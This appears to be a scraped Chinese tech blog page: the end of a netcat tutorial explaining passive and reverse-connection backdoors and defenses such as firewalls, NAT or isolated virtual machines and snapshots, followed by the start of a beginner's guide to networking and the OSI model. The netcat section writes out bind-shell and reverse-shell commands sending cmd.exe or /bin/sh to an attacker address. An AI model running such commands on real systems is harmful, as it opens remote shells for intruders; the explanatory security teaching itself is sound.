-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">xxx</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
-<p>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -l -p xxx -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
-
-<p><strong>步骤2</strong><br>　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
-<h3 id="◇补充说明：-e-选项"><a href="#◇补充说明：-e-选项" class="headerlink" title="◇补充说明：-e 选项"></a>◇补充说明：<code>-e</code> 选项</h3><p>　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p>
-<h3 id="◇【不够】靠谱的防范措施"><a href="#◇【不够】靠谱的防范措施" class="headerlink" title="◇【不够】靠谱的防范措施"></a>◇【不够】靠谱的防范措施</h3><p>　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br>1、浏览器的漏洞<br>2、使用公共 wifi 热点的习惯<br>3、防火墙的设置</p>
-<p>　　对第1点<br>　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p>
-<p>　　对第2点<br>　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p>
-<p>　　对第3点<br>　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>　　但是！（俺要开始说【但是】了）<br>　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>再比如说：直接把防火墙的过滤模块干掉；<br>更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p>
-<h3 id="◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）"><a href="#◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）" class="headerlink" title="◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）"></a>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><p>　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">扫盲操作系统虚拟机</a>》系列教程。</p>
-<p>　　要想用这招，步骤如下：<br>1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>3、虚拟系统的网卡设置为【NAT】模式</p>
-<p>　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br>　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p>
-<h3 id="◇补充说明：“NAT-模式”如何搭配“系统防火墙”？"><a href="#◇补充说明：“NAT-模式”如何搭配“系统防火墙”？" class="headerlink" title="◇补充说明：“NAT 模式”如何搭配“系统防火墙”？"></a>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><p>　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p>
-<h2 id="★招数12：（入侵手法）用-nc-开启【主动】连接型后门"><a href="#★招数12：（入侵手法）用-nc-开启【主动】连接型后门" class="headerlink" title="★招数12：（入侵手法）用 nc 开启【主动】连接型后门"></a>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><h3 id="◇使用场景-11"><a href="#◇使用场景-11" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br>　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br>　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。</p>
-<h3 id="◇原理-3"><a href="#◇原理-3" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。</p>
-<h3 id="◇入侵方法-1"><a href="#◇入侵方法-1" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lk -p xxx</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>步骤2</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">xxx</span><br></code></pre></td></tr></table></figure>
-<p>　　如果受害者是 POSIX 系统，则用如下命令：</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -e /bin/sh <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
-<p>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）</p>
-<h3 id="◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机"><a href="#◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机" class="headerlink" title="◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机"></a>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><p>　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br>　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。</p>
-<p>　　有必要提醒一下：<br>　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br>　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br>　　这下该咋办捏？<br>　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br>　　如果你对安全性的要求【非常高】，要学会：<br>1、用“快照功能”建立【安全基线】<br>（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br>2、养成【定期回退快照】的好习惯<br>（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）</p>
-<h3 id="◇“【主动】连接型后门”的优势之处（危险性之处）"><a href="#◇“【主动】连接型后门”的优势之处（危险性之处）" class="headerlink" title="◇“【主动】连接型后门”的优势之处（危险性之处）"></a>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><p>　　简单对比一下“后门的两种连接方式”。</p>
-<p><strong>可用性</strong><br>　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br>　　相比之下，“主动型后门”就【没有】这种弊端。</p>
-<p><strong>隐蔽性</strong><br>　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br>　　相比之下，“主动型后门”就【没有】这个问题。</p>
-<h2 id="★附录：netcat-的【其它变种】"><a href="#★附录：netcat-的【其它变种】" class="headerlink" title="★附录：netcat 的【其它变种】"></a>★附录：netcat 的【其它变种】</h2><p>　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。</p>
-<h3 id="◇GNU-netcat"><a href="#◇GNU-netcat" class="headerlink" title="◇GNU netcat"></a>◇GNU netcat</h3><p>　　官网在“<a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">这里</a>”。<br>　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br>　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）</p>
-<h3 id="◇ncat"><a href="#◇ncat" class="headerlink" title="◇ncat"></a>◇ncat</h3><p>　　这是 nmap 社区重写的 nc，其官网页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/">这里</a>”，帮助页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/guide/">这里</a>”。<br>　　它的口号是：Ncat - Netcat for the 21st Century<br>　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br>　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）</p>
-<h3 id="◇socat"><a href="#◇socat" class="headerlink" title="◇socat"></a>◇socat</h3><p>　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br>　　很多主流的 Linux 发行版已经包含它。<br>　　他也完全支持 SSL/TLS。</p>
-<h3 id="◇Cryptcat"><a href="#◇Cryptcat" class="headerlink" title="◇Cryptcat"></a>◇Cryptcat</h3><p>　　一看名称就能猜到：这是“加密的网猫”。<br>　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br>　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。</p>
-<h3 id="◇sbd"><a href="#◇sbd" class="headerlink" title="◇sbd"></a>◇sbd</h3><p>　　光看这3字母的名称，你可能不知道这款变种的特色。<br>　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br>　　它的加密采用“AES-128-CBC + HMAC-SHA1”。</p>
-<h3 id="◇netrw"><a href="#◇netrw" class="headerlink" title="◇netrw"></a>◇netrw</h3><p>　　这是专门针对“文件传输”功能进行强化和简化的变种。<br>　　【简化】方面<br>　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br>　　【强化】方面<br>　　它会对传输过程进行散列校验，以防止传输的数据被篡改。</p>
-</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T13:44:33.000Z" title="2021/7/16 下午9:44:33">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:24:27.446Z" title="2021/7/16 下午11:24:27">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></span><span class="level-item">3 小时读完 (大约25716个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">大话计算机网络</a></h1><div class="content"><h1 id="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”"><a href="#计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI-模型”" class="headerlink" title="计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”"></a>计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”</h1><p><strong>文章目录</strong></p>
-<p>★本文的目标读者<br>★基本概念<br>★从“分层”到“参考模型”<br>★OSI 概述<br>★物理层：概述<br>★物理层：具体实例<br>★链路层：概述<br>★链路层：具体实例<br>★网络层：概述<br>★网络层：具体实例<br>★传输层：概述<br>★传输层：具体实例<br>★业务层（OSI 上三层）：概述<br>★业务层（OSI 上三层）：具体实例<br>★杂项<br>★参考书目</p>
-<p>　　近期老是在写政治博文，又有两个月左右没写技术博文了。某些技术型的读者，背地里肯定骂俺太懒。今天搞了一篇内容特别长，信息量特别多的。喜欢看技术博文的读者，可以慢慢消化。</p>
-<h2 id="★本文的目标读者"><a href="#★本文的目标读者" class="headerlink" title="★本文的目标读者"></a>★本文的目标读者</h2><p>　　今天这篇的标题是“扫盲”，也就是说：即使那些完全不懂 IT 领域，也不懂通讯领域的读者，依然能看懂（至少能看懂一部分）。为了做到这点，俺会尽量使用通俗的比喻，并适当加一些示意图。<br>　　另外，就算你已经比较了解网络通讯领域，本文中提到的某些部分，也可能是你所不知道的。也就是说：懂行的同学，看看此文，也会有帮助。<br>　　本文的标题特地强调了【系统性】——俺希望这篇教程能帮助读者对“计算机网络”这个领域进行系统性学习（何为“系统性学习”？请看<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">这篇教程</a>）<br>　　为了做到【系统性】这个目的，这篇教程很长。俺开博12年，这篇的长度估计能排到前5名。建议大伙儿慢慢看，不要着急。</p>
-<h2 id="★基本概念"><a href="#★基本概念" class="headerlink" title="★基本概念"></a>★基本概念</h2><p>　　为了足够通俗，俺先要介绍一些基本概念。</p>
-<h3 id="◇信道（channel）"><a href="#◇信道（channel）" class="headerlink" title="◇信道（channel）"></a>◇信道（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Communication_channel">channel</a>）</h3><p>　　这是通讯领域非常基本的概念，肯定要先聊聊它。<br>　　通俗地说，信道就是“传送信息的通道”。</p>
-<h3 id="◇信道的类型"><a href="#◇信道的类型" class="headerlink" title="◇信道的类型"></a>◇信道的类型</h3><p>　　首先，信道可以从广义上分为“物理信道 ＆ 逻辑信道”。<br>　　顾名思义，“物理信道”就是直接使用某种【物理介质】来传送信息；至于“逻辑信道”——是基于“物理信道”之上抽象出来的玩意儿（待会儿讲到“协议栈”的时候再聊）。</p>
-<h3 id="◇信道的带宽"><a href="#◇信道的带宽" class="headerlink" title="◇信道的带宽"></a>◇信道的带宽</h3><p>　　“带宽”指的是：某个信道在单位时间内最大能传输多少比特的信息。<br>　　请注意：<br>　　电气领域 ＆ 计算机领域都有“带宽”这个概念，但两者的定义不太一样。电气领域所说的“带宽”指的是“模拟带宽”，单位是“赫兹/Hz”；计算机领域所说的“带宽”指“数字带宽”，单位是“比特率”或“字节率”。<br>　　后续章节提到“带宽”，都是指计算机领域的术语。</p>
-<h3 id="◇带宽的单位——容易把外行绕晕"><a href="#◇带宽的单位——容易把外行绕晕" class="headerlink" title="◇带宽的单位——容易把外行绕晕"></a>◇带宽的单位——容易把外行绕晕</h3><p>　　“比特率”或“字节率”很容易搞混淆。用英文表示的话——大写字母 <code>B</code> 表示【字节】；小写字母 <code>b</code> 表示【比特】。</p>
-<p>　　由于带宽的数字通常很大，要引入“K、M、G”之类的字母表示数量级，于是又引出一个很扯蛋的差异——“10进制”与“2进制”的差异。<br>　　【10进制】的 <code>K</code> 表示 1000；<code>M</code> 表示 1000x1000（1百万）<br>　　【2进制】的 <code>K</code> 表示 1024（2的10次方）；<code>M</code> 表示 1024x1024（2的20次方）<br>　　为了避免扯皮，后来国际上约定了一个规矩：对【2进制】的数量级要加一个小写字母 <code>i</code>。比如说：<code>Ki</code> 表示 1024；<code>Mi</code> 表示 1024x1024 …… 以此类推。<br>　　举例：<br>　　1Kbps 表示“1000比特每秒”<br>　　1KiBps 表示“1024字节每秒”</p>
-<h3 id="◇信道的工作模式：单工-VS-半双工-VS-全双工"><a href="#◇信道的工作模式：单工-VS-半双工-VS-全双工" class="headerlink" title="◇信道的工作模式：单工 VS 半双工 VS 全双工"></a>◇信道的工作模式：单工 VS 半双工 VS 全双工</h3><p>　　再来说说信道的工作模式。大致可以分为如下三种。为了让大伙儿比较好理解，俺对每一种都举相应的例子。</p>
-<p><strong>单工（simplex）</strong><br>　　比如“电台广播”就是典型的【单工】。“电台”可以发信号给“收音机”，但“收音机”【不能】发信号给“电台”。</p>
-<p><strong>半双工（half-duplex）</strong><br>　　比如“单条铁路轨道”，就是典型的【半双工】。火车在单条铁轨上，可以有两种运行方向；但对于同一个瞬间，只能选其中一个方向（否则就撞车了）。</p>
-<p><strong>全双工（full-duplex）</strong><br>　　比如“光纤”就是典型的【全双工】。在同一根光导纤维中，可以有多个光束【同时相向】传播，互相不会干扰对方。</p>
-<h3 id="◇端点"><a href="#◇端点" class="headerlink" title="◇端点"></a>◇端点</h3><p>　　为了叙述方便，俺把参与通讯的对象（主体）称作“通讯端点”，简称“端点”。<br>　　这里的“端点”是广义的，可以是硬件（比如某个网卡），也可以是软件（比如某个应用程序）。</p>
-<h3 id="◇单播、组播-多播、广播、选播"><a href="#◇单播、组播-多播、广播、选播" class="headerlink" title="◇单播、组播/多播、广播、选播"></a>◇单播、组播/多播、广播、选播</h3><p>　　对于“网络通讯”，至少得有 N 个端点参与，并且【N ≥ 2】才有意义。<br>　　当 N 个端点构成一个网络，这时候就会涉及到“单播、组播、广播”这几个概念。<br>　　通俗地说：<br>单播（unicast）——发送给网络中的指定的【单个】端点<br>组播/多播（multicast）——发送给网络中的指定的【多个】端点<br>广播（broadcast）——发送给网络中的【所有】端点<br>选播（anycast）——发送给网络中随机选择的【单个】端点</p>
-<h3 id="◇通讯协议（protocol）"><a href="#◇通讯协议（protocol）" class="headerlink" title="◇通讯协议（protocol）"></a>◇通讯协议（protocol）</h3><p>　　所谓的“通讯协议”就是：参与通讯的各方所采用的某种【约定】。只有大家都遵守这个约定，才有可能相互传递信息。<br>　　打个比方：如果两个人要用自然语言交流，前提是：双方使用相同（或相互兼容）的自然语言。<br>　　“通讯协议”就类似某种自然语言，参与通讯的多个端点，都必须能理解这个语言。</p>
-<h2 id="★从“分层”到“参考模型”"><a href="#★从“分层”到“参考模型”" class="headerlink" title="★从“分层”到“参考模型”"></a>★从“分层”到“参考模型”</h2><h3 id="◇分层"><a href="#◇分层" class="headerlink" title="◇分层"></a>◇分层</h3><p>　　在聊“分层”之前，先说说“分工”。比如在一个公司中，通常设有不同的工种/岗位，这就【分工】。<br>　　对于网络通讯也是如此，不太可能用一种通讯协议完成所有的信息传递任务（注：对于特别简单的网络，或许有可能只用单一协议；但如今的网络通讯已经很复杂，用【单个】通讯协议包办所有事情，已经不太可能）<br>　　一旦采用了多种通讯协议，这几种协议之间，该如何配合捏？<br>　　在网络通讯领域，采用的是【分层】的设计思路。多个层次的协议在一起协同工作，技术上称作“协议栈”（洋文叫做“protocol stack”）。</p>
-<h3 id="◇协议栈的原理"><a href="#◇协议栈的原理" class="headerlink" title="◇协议栈的原理"></a>◇协议栈的原理</h3><p>　　对于多层次的协议栈。每个层次都有各自的“端点”（进行通讯的主体）。处于【同一层次】的两个端点会使用该层次的协议进行通讯（注：同一个层次的协议，可能只有一个，也可能有多个）。<br>　　除了最顶层，每个层次的端点会向其【直接】上层提供“服务”；除了最底层，每个层次的端点会调用【直接】下层提供的“服务”（这里所说的“服务”指某种“编程接口”，技术行话叫 API）。</p>
-<p><img src="https://lh3.googleusercontent.com/bK34KOVTYWmZNuIOY-0CxbJn1tR8LV_-78VflTiRK3rFM_YjVPa6lSbdxU58ICNFqTo2ghGjicgekyoZ4CNdFDe7ucMEM3BVHDA48S44mNn7e7Rf-5L3XDxYrjGDUpFp3AvkLDxb78w" alt="不见图 请翻墙"><br>（“协议栈”的示意图）</p>
-<p><img src="https://lh5.googleusercontent.com/qfAnnow_Fl7VudJd1GS39MJxLfXymYvKQ7ISRvYoSG4RKl8AltCB2Ru86zf78ABHd3ZrzI6sNF9Z65I9z8-He26A7hSInp-Pf2Quduw26FHGWMb2VK5YK-yLWnG8F2UibWqgzYwGSaU" alt="不见图 请翻墙"><br>（“服务”与“协议”之间的关系）</p>
-<h3 id="◇逻辑信道"><a href="#◇逻辑信道" class="headerlink" title="◇逻辑信道"></a>◇逻辑信道</h3><p>　　（前一个小节说了）每个层次会向上一个层次提供服务（API 调用）。对上层而言，调用下层提供的 API 发送信息，其效果相当于在使用某种【信道】进行通讯，这也就是俺在 ★基本概念 那个章节所说的“逻辑信道”。</p>
-<p><img src="https://lh4.googleusercontent.com/OzflASXF1Xv5c3-eg-RiT4ENcwjZx4jpeVYlj01YI6I-1L-Wgjl3FE47Rc94Dn9JAcTnHGcEES1KcaSSjHkZQeG1iKWgamZWrMtC0QTMpbHnO7NQeZvuMIeS9Sx8pI7gNg7DlakovkY" alt="不见图 请翻墙"><br>（“逻辑信道”示意图）</p>
-<h3 id="◇数据格式的原理"><a href="#◇数据格式的原理" class="headerlink" title="◇数据格式的原理"></a>◇数据格式的原理</h3><p>　　大部分协议会把要传送的数据切割为 N 份，每一份就是一个数据包。<br>　　通常来说，数据包的格式有如下三部分：</p>
-<blockquote>
-<p>头部<br>身体（也称作“有效载荷”）<br>尾部（注：很多协议没有尾部）</p>
-</blockquote>
-<p>　　如果你收过快递，可以把“网络数据包”与“快递包裹”作一个对照——<br>数据包的“头/尾”，就类似于快递包裹的【包装袋】。数据包的“身体”，就类似于快递包裹里面的东西。</p>
-<p>　　对于【相邻】两层的协议，【下】层包含【上】层。也就是说：下层协议的【载荷】就是上层协议的【整体】。<br>　　还是以快递举例：<br>　　假设你从网上买了一台笔记本电脑。电脑出厂时，电脑厂商肯定会提供一个包装盒。快递公司在寄送这台笔记本的时候，又会在笔记本的盒子外面再加一个包装袋。对应到网络协议——“快递公司的包装袋”相当于【下层】协议；“电脑厂商的包装盒”，相当于【上层】协议。</p>
-<p><img src="https://lh3.googleusercontent.com/bz_Gg8ow_9ZM4dqw9wEfGaEXZmpusHPT9pwhILsvusYq6XPZa__M5GsfF07xCnoAV-S2udQ0unbuAbUgWqx9vCgF71t7RgQhsgkNL6Ol76wueKdvWU-nukPat8i7VlVFXs2FDrthrt0" alt="不见图 请翻墙"><br>（上下层协议的格式及包含关系）</p>
-<h3 id="◇网络分层的参考模型"><a href="#◇网络分层的参考模型" class="headerlink" title="◇网络分层的参考模型"></a>◇网络分层的参考模型</h3><p>　　上述所说的“分层 ＆ 协议栈”只是一个抽象的（笼统的）思路。具体要分几层？每一层要干啥事儿？这些都是很有讲究滴！网络技术发展了几十年，已经有很多牛人提出了各种不同的划分方案，称之为“网络分层的参考模型”（为了打字省力，以下简称“模型”）。<br>　　在各种模型中，名气最大的当然是“OSI 模型”（洋文称作“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/OSI_model">OSI model</a>”）。在后续的章节中，俺会以这个模型为主体，进行介绍。<br>　　除了“OSI 模型”还有一个很出名的模型是“TCP/IP 模型”（因为互联网很成功，它才跟着出名）。<br>　　对“TCP/IP 模型”的分层，不同的文章或书籍，说法不太一样（“3层、4层、5层”皆有），这就引发了一些争议。包括几位热心读者也在博客留言，表达不同意见。为了避免一家之言，贴出维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_protocol_suite#Layer_names_and_number_of_layers_in_the_literature">这个链接</a>”，其中给出了几种比较有名的说法。<br>　　另外，俺想提醒一下：<br>　　由于本文是基于【OSI 模型】进行展开。对于 TCP/IP 模型到底算几层，这方面的争论【不】影响本文后续的内容。</p>
-<h2 id="★OSI-概述"><a href="#★OSI-概述" class="headerlink" title="★OSI 概述"></a>★OSI 概述</h2><h3 id="◇OSI-的历史"><a href="#◇OSI-的历史" class="headerlink" title="◇OSI 的历史"></a>◇OSI 的历史</h3><p>　　“OSI”的全称是“Open System Interconnection”。先说说它的历史。<br>　　上世纪70年代，“国际电信联盟”（ITU）想对各国的电信系统（电话/电报）建立标准化的规格；与此同时，“国际标准化组织”（ISO）想要建立某种统一的标准，使得不同公司制造的大型主机可以相互联网。<br>　　后来，这两个国际组织意识到：“电信系统互联”与“电脑主机互联”的性质差不多。于是 ISO 与 ITU 就决定合作，两家一起干。这2个组织的2套班子，从上世纪70年代开始搞，搞来搞去，搞了很多年，一直到1984年才终于正式发布 OSI 标准。</p>
-<h3 id="◇OSI-标准的两个组成部分"><a href="#◇OSI-标准的两个组成部分" class="headerlink" title="◇OSI 标准的两个组成部分"></a>◇OSI 标准的两个组成部分</h3><p>　　严格来讲，OSI 包括两大部分——<br>其一，抽象的概念模型，也就是前面提到的【OSI model】；<br>其二，针对这个概念模型的具体实现（具体的通讯协议），洋文叫做【OSI protocols】。</p>
-<p>　　（前面说了）OSI 是由 ISO ＆ ITU 联手搞出来滴。这两个国际组织里面的人，要么是来自各国的电信部门，要么是来自各国的高校学者。总而言之，既有严重的官僚风气，又有明显的学究风气。（正是因为这两种风气叠加，所以搞了很多年，才搞出 OSI）<br>　　OSI 的协议实现（OSI protocols），不客气地说，就是一堆垃圾——据说把 OSI protocols 所有的协议文档，全部打印成 A4 纸，摞起来得有一米多高！是不是很吓人？协议搞得如此复杂，严重违背了 IT 设计领域的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/KISS_principle">KISS 原则</a>。<br>　　由于 OSI protocols 实在太复杂，后来基本没人用。但 OSI model 反而广为流传，并且成为“网络分层模型”中名气最大，影响力最广的一个。<br>　　因此，本文后续章节中，凡是提到 OSI，指的是【OSI model】。</p>
-<h3 id="◇OSI-模型的7层"><a href="#◇OSI-模型的7层" class="headerlink" title="◇OSI 模型的7层"></a>◇OSI 模型的7层</h3><p>　　OSI 模型总共分7层，示意图参见如下表格：</p>
-<table>
-<thead>
-<tr>
-<th>层次</th>
-<th>中文名</th>
-<th>洋文名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>第7层</td>
-<td>应用层</td>
-<td>Application Layer</td>
-</tr>
-<tr>
-<td>第6层</td>
-<td>表示层</td>
-<td>Presentation Layer</td>
-</tr>
-<tr>
-<td>第5层</td>
-<td>会话层</td>
-<td>Session Layer</td>
-</tr>
-<tr>
-<td>第4层</td>
-<td>传输层</td>
-<td>Transport Layer</td>
-</tr>
-<tr>
-<td>第3层</td>
-<td>网络层</td>
-<td>Network Layer</td>
-</tr>
-<tr>
-<td>第2层</td>
-<td>数据链路层</td>
-<td>Data Link Layer</td>
-</tr>
-<tr>
-<td>第1层</td>
-<td>物理层</td>
-<td>Physical Layer</td>
-</tr>
-</tbody></table>
-<p>（注：为了打字省力，在后续章节把“数据链路层”直接称为“链路层”）</p>
-<p>　　考虑到本文是针对一般性读者的【扫盲教程】，俺重点聊第1~4层。搞明白这几个层次之后，有助于你更好地理解网络的很多概念，也有助于你更好地理解很多信息安全的概念。<br>　　接下来在讨论 OSI 的每个层次时，俺都会专门写一个小节，谈该层次的【必要性】。搞明白【必要性】，你就知道为啥要引入这个层次。</p>
-<h2 id="★物理层：概述"><a href="#★物理层：概述" class="headerlink" title="★物理层：概述"></a>★物理层：概述</h2><h3 id="◇物理层的必要性"><a href="#◇物理层的必要性" class="headerlink" title="◇物理层的必要性"></a>◇物理层的必要性</h3><p>　　通俗地说：直接与物理介质打交道的层次，就是物理层。这一层的必要性比较明显。<br>　　因为所有的通讯，归根结底都要依赖于【物理介质】。与物理介质打交道，需要牵涉到很多与【物理学】相关的东东。比如：“无线电通讯”需要关心“频率/波长”；电缆通讯需要跟“电压”打交道；“光纤通讯”需要关心“玻璃的折射率＆光线的入射角” ……<br>　　“物理层”的主要职责是：屏蔽这些细节，使得“物理层”之上的层次不用再去操心物理学。</p>
-<h3 id="◇物理信道的类型"><a href="#◇物理信道的类型" class="headerlink" title="◇物理信道的类型"></a>◇物理信道的类型</h3><p>　　何为“物理信道”，在本文开篇的“基本概念”已经提到了。<br>　　对于“物理信道”，还可以进一步细分为如下三大类：<br>\1. 有线信道（比如：双绞线、同轴电缆、光纤、等等）<br>\2. 无线信道（比如：微波通讯、电台广播、卫星通讯、等等）<br>\3. 存储信道</p>
